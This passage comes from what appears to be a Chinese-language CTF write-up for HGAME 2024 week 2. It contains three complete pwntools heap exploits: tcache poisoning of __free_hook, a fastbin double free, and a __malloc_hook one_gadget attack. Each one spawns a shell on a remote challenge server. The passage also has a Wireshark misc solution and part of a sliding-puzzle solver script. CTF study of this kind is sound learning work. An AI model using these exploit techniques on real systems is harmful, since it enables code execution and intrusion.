class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">id1,name</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content:&#x27;</span>,name)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add(i,<span class="number">0x80</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">8</span>,p64(__free_hook))</span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">11</span>,p64(system_addr))</span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/p_1_1.png"></p><h2 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h2><p>fastbin double free</p><p>参考链接：<a href="https://blog.csdn.net/qq_62172019/article/details/133359490">HGAME 2023 new_fast_note</a></p><p>也是拿里面的脚本改一下即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.57.14&#x27;</span>,<span class="number">30208</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add(i,<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">show(<span class="number">7</span>) </span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecb80</span> - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>) </span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>) </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">add(i,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">9</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(sys_addr)) </span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/p_2_1.png"></p><h2 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h2><p>参考链接：<a href="https://blog.csdn.net/weixin_73290593/article/details/128831906">Hgame-2023(前三周pwn题解)</a></p><p>这次是<code>libc-2.23.so</code></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.57.14&#x27;</span>,<span class="number">30350</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">__malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">one_gadget[i]+=libc_base</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,p64(__malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget[<span class="number">3</span>])+p64(realloc+<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="string">&quot;0x55&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/p_3_1.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h2><p>用Wireshark从HTTP流量中提取出文件，得到一个jpg图片，图片底部有flag。</p><p><img src="/./hgame2024_week2/m_1_1.jpg"></p><h2 id="我要成为华容道高手"><a href="#我要成为华容道高手" class="headerlink" title="我要成为华容道高手"></a>我要成为华容道高手</h2><p>在github上找到了一个解决华容道的js代码</p><p>参考链接：<a href="https://github.com/conwnet/huarongdao/">华容道</a></p><p>用js代码写一个爬虫，接收棋盘字符串，解决后再发送过去。</p><p>js稀烂，写的是屎山代码，用递归来解决新的<code>layout</code>。</p><p>nodejs运行，即可得到flag。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 0 空位</span></span><br><span class="line"><span class="comment"> * 1 实体</span></span><br><span class="line"><span class="comment"> * 2 单兵</span></span><br><span class="line"><span class="comment"> * 3 竖行</span></span><br><span class="line"><span class="comment"> * 4 横行</span></span><br><span class="line"><span class="comment"> * 5 BOSS</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 交换数组的中元素，如果数字是两个数字，则交换 arr[i] 和 arr[j]</span></span><br><span class="line"><span class="comment">  * 如果参数是两个数组，需要保证两数组长度相等，将数组中所有 index 依次替换</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> &#123;<span class="type">Number | Array</span>&#125; <span class="variable">i</span></span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> &#123;<span class="type">Number | Array</span>&#125; <span class="variable">j</span></span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">swap</span> = <span class="keyword">function</span> (<span class="params">i, j</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> i === <span class="string">&#x27;number&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> j === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="variable language_">this</span>[i];</span><br><span class="line">        <span class="variable language_">this</span>[i] = <span class="variable language_">this</span>[j];</span><br><span class="line">        <span class="variable language_">this</span>[j] = tmp;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i.<span class="property">length</span> === j.<span class="property">length</span>) &#123;</span><br><span class="line">        i.<span class="title function_">forEach</span>(<span class="function">(<span class="params">_, k</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> tmp = <span class="variable language_">this</span>[i[k]];</span><br><span class="line">            <span class="variable language_">this</span>[i[k]] = <span class="variable language_">this</span>[j[k]];</span><br><span class="line">            <span class="variable language_">this</span>[j[k]] = tmp;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos 位置的棋子向上移动，返回移动后的棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state 棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos 位置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveUp</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos - <span class="number">4</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>], [pos - <span class="number">4</span>, pos]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos - <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>], [pos - <span class="number">4</span>, pos - <span class="number">3</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos - <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>, pos + <span class="number">4</span>, pos + <span class="number">5</span>], [pos - <span class="number">4</span>, pos - <span class="number">3</span>, pos, pos + <span class="number">1</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos 位置的棋子向下移动，返回移动后的棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state 棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos 位置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveDown</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos + <span class="number">4</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">8</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">4</span>, pos], [pos + <span class="number">8</span>, pos + <span class="number">4</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">5</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>], [pos + <span class="number">4</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">8</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">9</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">4</span>, pos + <span class="number">5</span>, pos, pos + <span class="number">1</span>], [pos + <span class="number">8</span>, pos + <span class="number">9</span>, pos + <span class="number">4</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos 位置的棋子向左移动，返回移动后的棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state 棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos 位置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveLeft</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos - <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>], [pos - <span class="number">1</span>, pos + <span class="number">3</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>], [pos - <span class="number">1</span>, pos]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>, pos + <span class="number">1</span>, pos + <span class="number">5</span>], [pos - <span class="number">1</span>, pos + <span class="number">3</span>, pos, pos + <span class="number">4</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos 位置的棋子向右移动，返回移动后的棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state 棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos 位置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveRight</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">1</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">5</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">1</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>], [pos + <span class="number">1</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">2</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">2</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">1</span>, pos], [pos + <span class="number">2</span>, pos + <span class="number">1</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">2</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">6</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">2</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">1</span>, pos + <span class="number">5</span>, pos, pos + <span class="number">4</span>], [pos + <span class="number">2</span>, pos + <span class="number">6</span>, pos + <span class="number">1</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 Array 实现的队列，本以为 Array 做队列可能会影响性能，</span></span><br><span class="line"><span class="comment"> * 实际尝试发现没啥影响，主要是由于棋盘状态数太少了，一般不到十万</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">size</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">front</span> = <span class="variable language_">this</span>.<span class="property">tail</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fullFlag</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">size</span> = size || <span class="number">1048576</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    push (data) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">fullFlag</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Can not push a value into a full queue!&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable language_">this</span>.<span class="property">tail</span>++] = data;</span><br><span class="line">        <span class="variable 